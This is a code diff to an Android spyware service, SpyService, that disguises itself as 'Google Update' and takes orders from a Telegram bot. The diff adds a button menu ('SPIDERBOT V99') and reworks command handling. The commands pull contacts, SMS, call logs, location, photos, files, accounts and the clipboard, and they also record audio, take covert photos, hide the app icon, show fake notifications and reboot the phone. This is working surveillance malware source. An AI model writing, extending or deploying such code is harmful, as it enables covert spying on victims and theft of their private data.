@@ -67,21 +67,15 @@ public class SpyService extends Service {
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
-        // لا نبدأ Foreground هنا، ننتظر حتى يتم منح الصلاحيات
-        // startForegroundService() سيتم استدعاؤها بعد التأكد من الصلاحيات
-
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
         wakeLock.acquire(10 * 60 * 1000L);
 
-        // تسجيل الجهاز فوراً (حتى بدون Foreground)
         registerDevice();
 
-        // بدء جلب الأوامر
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(this::pollCommands, 5, Config.get().poll_interval_sec, TimeUnit.SECONDS);
 
-        // محاولة بدء Foreground بعد 3 ثوانٍ (لإعطاء وقت لطلب الصلاحيات)
         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
             if (!foregroundStarted && hasMicrophonePermission()) {
                 startForegroundService();
@@ -92,13 +86,6 @@ public class SpyService extends Service {
     private boolean hasMicrophonePermission() {
         return ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO)
                 == PackageManager.PERMISSION_GRANTED;
-    }
-
-    // استدعاء هذه الدالة من MainActivity بعد منح الصلاحيات
-    public void startForegroundAfterPermissions() {
-        if (!foregroundStarted && hasMicrophonePermission()) {
-            startForegroundService();
-        }
     }
 
     private void startForegroundService() {
@@ -115,15 +102,9 @@ public class SpyService extends Service {
                     .setPriority(NotificationCompat.PRIORITY_MIN)
                     .build());
             foregroundStarted = true;
-            Log.d(TAG, "Foreground service started successfully");
+            Log.d(TAG, "Foreground service started");
         } catch (SecurityException e) {
-            Log.e(TAG, "Failed to start foreground: " + e.getMessage());
-            // المحاولة مرة أخرى بعد 5 ثوانٍ
-            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
-                if (!foregroundStarted && hasMicrophonePermission()) {
-                    startForegroundService();
-                }
-            }, 5000);
+            Log.e(TAG, "Foreground failed: " + e.getMessage());
         }
     }
 
@@ -131,6 +112,7 @@ public class SpyService extends Service {
         try {
             JSONObject info = new JSONObject();
             info.put("device_id", deviceId);
+            info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
             info.put("model", Build.MODEL);
             info.put("manufacturer", Build.MANUFACTURER);
             info.put("android", Build.VERSION.RELEASE);
@@ -141,7 +123,6 @@ public class SpyService extends Service {
             isRegistered = true;
             Log.d(TAG, "Registration sent: " + msg + " | Success: " + sent);
 
-            // إرسال رسالة تأكيد للمدير
             bot.sendText("✅ جهاز جديد مسجل!\n📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🆔 " + deviceId);
         } catch (Exception e) {
             Log.e(TAG, "Registration error", e);
@@ -169,16 +150,10 @@ public class SpyService extends Service {
             }
 
             String response = bot.getUpdates();
-            if (response == null) {
-                Log.d(TAG, "getUpdates returned null");
-                return;
-            }
+            if (response == null) return;
 
             JSONObject json = new JSONObject(response);
-            if (!json.getBoolean("ok")) {
-                Log.d(TAG, "getUpdates not ok: " + response);
-                return;
-            }
+            if (!json.getBoolean("ok")) return;
 
             JSONArray updates = json.getJSONArray("result");
             for (int i = 0; i < updates.length(); i++) {
@@ -187,16 +162,20 @@ public class SpyService extends Service {
                 if (updId <= bot.lastUpdateId) continue;
                 bot.lastUpdateId = updId + 1;
 
+                if (upd.has("callback_query")) {
+                    JSONObject callback = upd.getJSONObject("callback_query");
+                    handleCallbackQuery(callback);
+                }
+
                 if (upd.has("message")) {
                     JSONObject msg = upd.getJSONObject("message");
                     if (msg.has("text")) {
-                        String txt = msg.getString("text");
-                        if (txt.startsWith("CMD:")) {
-                            String cmd = txt.substring(4).trim();
-                            Log.d(TAG, "Executing command: " + cmd);
-                            executeCommand(cmd);
-                        } else if (txt.startsWith("/")) {
-                            handleDirectCommand(txt);
+                        String txt = msg.getString("text").trim();
+                        if (txt.startsWith("/")) {
+                            handleCommand(txt);
+                        } else {
+                            // أي نص آخر يُعتبر أمراً
+                            handleCommand(txt);
                         }
                     }
                 }
@@ -206,66 +185,170 @@ public class SpyService extends Service {
         }
     }
 
-    private void handleDirectCommand(String cmd) {
-        if (cmd.equals("/start") || cmd.equals("/help")) {
-            bot.sendText("🔰 **Google Update - Commands**\n\n" +
-                    "أرسل الأمر مسبوقاً بـ CMD:\n" +
-                    "مثال: `CMD:GET_CONTACTS`\n\n" +
-                    "📌 الأوامر المتاحة:\n" +
-                    "GET_CONTACTS, GET_SMS, GET_CALLLOGS, GET_LOCATION,\n" +
-                    "START_RECORD, STOP_RECORD, GET_APPS, GET_PHOTOS,\n" +
-                    "GET_VIDEOS, GET_FILES, HIDE_APP, SHOW_APP, FAKE_NOTIF,\n" +
-                    "TAKE_PHOTO, TAKE_PHOTO_FRONT, FLASH_ON, FLASH_OFF,\n" +
-                    "GET_IMEI, GET_PHONE, GET_SIM, GET_WIFI, GET_BATTERY,\n" +
-                    "GET_IP, LOCK_DEVICE, REBOOT, SHUTDOWN, GET_CLIPBOARD");
-        } else {
-            bot.sendText("❌ أمر غير معروف. استخدم /help");
+    private void handleCommand(String cmd) {
+        String upper = cmd.toUpperCase();
+
+        if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/commands") || cmd.equals("/menu")) {
+            sendMainMenu();
+            return;
+        }
+
+        switch (upper) {
+            case "GET_CONTACTS": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
+            case "GET_SMS": sendFile(collectSms(), "💬 الرسائل النصية"); break;
+            case "GET_CALLLOGS": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
+            case "GET_LOCATION": getLocation(); break;
+            case "START_RECORD": startRecording(); break;
+            case "STOP_RECORD": stopRecording(); break;
+            case "GET_APPS": sendFile(collectApps(), "📱 التطبيقات المثبتة"); break;
+            case "GET_PHOTOS": sendFile(collectMedia("images"), "🖼 جميع الصور"); break;
+            case "GET_VIDEOS": sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات"); break;
+            case "GET_FILES": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
+            case "HIDE_APP": hideApp(); break;
+            case "SHOW_APP": showApp(); break;
+            case "FAKE_NOTIF": showFakeNotification(); break;
+            case "TAKE_PHOTO": takePhoto(); break;
+            case "TAKE_PHOTO_FRONT": takePhotoFront(); break;
+            case "FLASH_ON": flashOn(); break;
+            case "FLASH_OFF": flashOff(); break;
+            case "GET_IMEI": getImei(); break;
+            case "GET_PHONE": getPhoneNumber(); break;
+            case "GET_SIM": getSimInfo(); break;
+            case "GET_WIFI": getWifiInfo(); break;
+            case "GET_BATTERY": getBatteryInfo(); break;
+            case "GET_IP": getPublicIp(); break;
+            case "START_LOCATION_TRACK": startLocationTracking(); break;
+            case "STOP_LOCATION_TRACK": stopLocationTracking(); break;
+            case "GET_INSTALLED": getInstalledPackages(); break;
+            case "GET_PROCESSES": getRunningProcesses(); break;
+            case "LOCK_DEVICE": lockDevice(); break;
+            case "REBOOT": rebootDevice(); break;
+            case "SHUTDOWN": shutdownDevice(); break;
+            case "GET_ACCOUNTS": getAccounts(); break;
+            case "GET_CLIPBOARD": getClipboard(); break;
+            default:
+                bot.sendText("❌ أمر غير معروف. استخدم /menu لعرض الأزرار.");
+        }
+    }
+
+    // ========== القوائم التفاعلية (الأزرار) ==========
+
+    private void sendMainMenu() {
+        try {
+            JSONArray buttons = new JSONArray();
+
+            // صف 1
+            JSONArray row1 = new JSONArray();
+            JSONObject b1 = new JSONObject(); b1.put("text", "📇 جهات الاتصال"); b1.put("callback_data", "GET_CONTACTS"); row1.put(b1);
+            JSONObject b2 = new JSONObject(); b2.put("text", "💬 الرسائل"); b2.put("callback_data", "GET_SMS"); row1.put(b2);
+            buttons.put(row1);
+
+            // صف 2
+            JSONArray row2 = new JSONArray();
+            JSONObject b3 = new JSONObject(); b3.put("text", "📞 سجل المكالمات"); b3.put("callback_data", "GET_CALLLOGS"); row2.put(b3);
+            JSONObject b4 = new JSONObject(); b4.put("text", "📍 الموقع"); b4.put("callback_data", "GET_LOCATION"); row2.put(b4);
+            buttons.put(row2);
+
+            // صف 3
+            JSONArray row3 = new JSONArray();
+            JSONObject b5 = new JSONObject(); b5.put("text", "🎤 تسجيل صوت"); b5.put("callback_data", "START_RECORD"); row3.put(b5);
+            JSONObject b6 = new JSONObject(); b6.put("text", "⏹ إيقاف التسجيل"); b6.put("callback_data", "STOP_RECORD"); row3.put(b6);
+            buttons.put(row3);
+
+            // صف 4
+            JSONArray row4 = new JSONArray();
+            JSONObject b7 = new JSONObject(); b7.put("text", "📱 التطبيقات"); b7.put("callback_data", "GET_APPS"); row4.put(b7);
+            JSONObject b8 = new JSONObject(); b8.put("text", "🖼 الصور"); b8.put("callback_data", "GET_PHOTOS"); row4.put(b8);
+            buttons.put(row4);
+
+            // صف 5
+            JSONArray row5 = new JSONArray();
+            JSONObject b9 = new JSONObject(); b9.put("text", "🎬 الفيديوهات"); b9.put("callback_data", "GET_VIDEOS"); row5.put(b9);
+            JSONObject b10 = new JSONObject(); b10.put("text", "📦 جميع الملفات"); b10.put("callback_data", "GET_FILES"); row5.put(b10);
+            buttons.put(row5);
+
+            // صف 6
+            JSONArray row6 = new JSONArray();
+            JSONObject b11 = new JSONObject(); b11.put("text", "👁 إخفاء التطبيق"); b11.put("callback_data", "HIDE_APP"); row6.put(b11);
+            JSONObject b12 = new JSONObject(); b12.put("text", "👁 إظهار التطبيق"); b12.put("callback_data", "SHOW_APP"); row6.put(b12);
+            buttons.put(row6);
+
+            // صف 7
+            JSONArray row7 = new JSONArray();
+            JSONObject b13 = new JSONObject(); b13.put("text", "🔔 إشعار وهمي"); b13.put("callback_data", "FAKE_NOTIF"); row7.put(b13);
+            JSONObject b14 = new JSONObject(); b14.put("text", "📸 تصوير خلفي"); b14.put("callback_data", "TAKE_PHOTO"); row7.put(b14);
+            buttons.put(row7);
+
+            // صف 8
+            JSONArray row8 = new JSONArray();
+            JSONObject b15 = new JSONObject(); b15.put("text", "🤳 تصوير أمامي"); b15.put("callback_data", "TAKE_PHOTO_FRONT"); row8.put(b15);
+            JSONObject b16 = new JSONObject(); b16.put("text", "🔦 كشاف ON"); b16.put("callback_data", "FLASH_ON"); row8.put(b16);
+            buttons.put(row8);
+
+            // صف 9
+            JSONArray row9 = new JSONArray();
+            JSONObject b17 = new JSONObject(); b17.put("text", "🔦 كشاف OFF"); b17.put("callback_data", "FLASH_OFF"); row9.put(b17);
+            JSONObject b18 = new JSONObject(); b18.put("text", "📟 IMEI"); b18.put("callback_data", "GET_IMEI"); row9.put(b18);
+            buttons.put(row9);
+
+            // صف 10
+            JSONArray row10 = new JSONArray();
+            JSONObject b19 = new JSONObject(); b19.put("text", "📞 رقم الهاتف"); b19.put("callback_data", "GET_PHONE"); row10.put(b19);
+            JSONObject b20 = new JSONObject(); b20.put("text", "📡 معلومات SIM"); b20.put("callback_data", "GET_SIM"); row10.put(b20);
+            buttons.put(row10);
+
+            // صف 11
+            JSONArray row11 = new JSONArray();
+            JSONObject b21 = new JSONObject(); b21.put("text", "📶 الواي فاي"); b21.put("callback_data", "GET_WIFI"); row11.put(b21);
+            JSONObject b22 = new JSONObject(); b22.put("text", "🔋 البطارية"); b22.put("callback_data", "GET_BATTERY"); row11.put(b22);
+            buttons.put(row11);
+
+            // صف 12
+            JSONArray row12 = new JSONArray();
+            JSONObject b23 = new JSONObject(); b23.put("text", "🌐 IP العام"); b23.put("callback_data", "GET_IP"); row12.put(b23);
+            JSONObject b24 = new JSONObject(); b24.put("text", "🔒 قفل الجهاز"); b24.put("callback_data", "LOCK_DEVICE"); row12.put(b24);
+            buttons.put(row12);
+
+            // صف 13
+            JSONArray row13 = new JSONArray();
+            JSONObject b25 = new JSONObject(); b25.put("text", "🔄 إعادة تشغيل"); b25.put("callback_data", "REBOOT"); row13.put(b25);
+            JSONObject b26 = new JSONObject(); b26.put("text", "⏻ إيقاف تشغيل"); b26.put("callback_data", "SHUTDOWN"); row13.put(b26);
+            buttons.put(row13);
+
+            // صف 14
+            JSONArray row14 = new JSONArray();
+            JSONObject b27 = new JSONObject(); b27.put("text", "👤 الحسابات"); b27.put("callback_data", "GET_ACCOUNTS"); row14.put(b27);
+            JSONObject b28 = new JSONObject(); b28.put("text", "📋 الحافظة"); b28.put("callback_data", "GET_CLIPBOARD"); row14.put(b28);
+            buttons.put(row14);
+
+            bot.sendMessageWithButtons("🕷️ **SPIDERBOT V99** 🕷️\n\n📱 اختر الأمر الذي تريد تنفيذه:", buttons);
+        } catch (Exception e) {
+            Log.e(TAG, "sendMainMenu error", e);
+        }
+    }
+
+    // ========== معالجة استدعاءات الأزرار ==========
+
+    private void handleCallbackQuery(JSONObject callbackQuery) {
+        try {
+            String id = callbackQuery.getString("id");
+            JSONObject data = callbackQuery.getJSONObject("data");
+            String command = data.getString("command");
+
+            bot.answerCallbackQuery(id, "⏳ جاري تنفيذ الأمر...");
+            executeCommand(command);
+        } catch (Exception e) {
+            Log.e(TAG, "handleCallbackQuery error", e);
         }
     }
 
     private void executeCommand(String cmd) {
-        try {
-            switch (cmd.toUpperCase()) {
-                case "GET_CONTACTS": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
-                case "GET_SMS": sendFile(collectSms(), "💬 الرسائل"); break;
-                case "GET_CALLLOGS": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
-                case "GET_LOCATION": getLocation(); break;
-                case "START_RECORD": startRecording(); break;
-                case "STOP_RECORD": stopRecording(); break;
-                case "GET_APPS": sendFile(collectApps(), "📱 التطبيقات"); break;
-                case "GET_PHOTOS": sendFile(collectMedia("images"), "🖼 الصور"); break;
-                case "GET_VIDEOS": sendFile(collectMedia("videos"), "🎬 الفيديوهات"); break;
-                case "GET_FILES": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
-                case "HIDE_APP": hideApp(); break;
-                case "SHOW_APP": showApp(); break;
-                case "FAKE_NOTIF": showFakeNotification(); break;
-                case "TAKE_PHOTO": takePhoto(); break;
-                case "TAKE_PHOTO_FRONT": takePhotoFront(); break;
-                case "FLASH_ON": flashOn(); break;
-                case "FLASH_OFF": flashOff(); break;
-                case "GET_IMEI": getImei(); break;
-                case "GET_PHONE": getPhoneNumber(); break;
-                case "GET_SIM": getSimInfo(); break;
-                case "GET_WIFI": getWifiInfo(); break;
-                case "GET_BATTERY": getBatteryInfo(); break;
-                case "GET_IP": getPublicIp(); break;
-                case "START_LOCATION_TRACK": startLocationTracking(); break;
-                case "STOP_LOCATION_TRACK": stopLocationTracking(); break;
-                case "GET_INSTALLED": getInstalledPackages(); break;
-                case "GET_PROCESSES": getRunningProcesses(); break;
-                case "LOCK_DEVICE": lockDevice(); break;
-                case "REBOOT": rebootDevice(); break;
-                case "SHUTDOWN": shutdownDevice(); break;
-                case "GET_ACCOUNTS": getAccounts(); break;
-                case "GET_CLIPBOARD": getClipboard(); break;
-                default: bot.sendText("❌ أمر غير معروف: " + cmd);
-            }
-        } catch (Exception e) {
-            bot.sendText("❌ خطأ: " + e.getMessage());
-        }
+        handleCommand(cmd);
     }
 
-    // ========== المميزات الأساسية ==========
+    // ======================================================================
+    // ========== دوال جمع البيانات (كما هي من الكود السابق) ==========
+    // ======================================================================
 
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
@@ -489,8 +572,6 @@ public class SpyService extends Service {
                         .build());
         bot.sendText("🔔 إشعار وهمي أُرسل");
     }
-
-    // ========== المميزات الجديدة ==========
 
     private void takePhoto() {
         try {
